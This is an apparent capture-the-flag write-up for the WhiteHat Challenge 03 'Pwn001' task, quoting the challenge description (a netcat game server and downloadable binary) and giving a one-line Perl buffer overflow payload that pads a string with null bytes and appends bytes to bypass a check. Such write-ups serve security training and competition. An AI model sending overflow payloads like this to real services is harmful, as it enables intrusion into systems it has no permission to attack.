# WhiteHat Challenge 03 : Pwn001

**Category:** Pwn
**Points:** 20
**Solves:** 
**Description:**

>
>
> We have an action game by answering the question in the context of zombie disaster !!! Will you find a way to bypass "zombie_overflow" or become one of them?
>
> Play game by using netcat:  nc 103.237.99.35 25033
> Use IDA for static reverse and gdb for dynamic reverse.
> Download tool IDA: http://tools.whitehat.vn/download.
> IDA usage - http://whitehat.vn//threads/913 (Vietnamese)
> Download binary file here: (Ubuntu 14.04 64bit)
>
> http://material.wargame.whitehat.vn/challenges/3/Pwn001_2c53fc9cfc6d091c47d7b85a3030d6e8e8cc4bc2.zip
>
> Submit WhiteHat{sha1(flag)}
> Example: flag = Hello World
> sha1("Hello World") = 0a4d55a8d778e5022fab701977c5d840bbc486d0
> You must submit: WhiteHat{0a4d55a8d778e5022fab701977c5d840bbc486d0}
> (all hash charactera in lowercase)

## Write-up

```
print "katazz" . "\x00" x (256-6). "\xDE\xC0\n";
```

## Other write-ups and resources
* <https://www.youtube.com/watch?v=PZ3GcjWe0yg>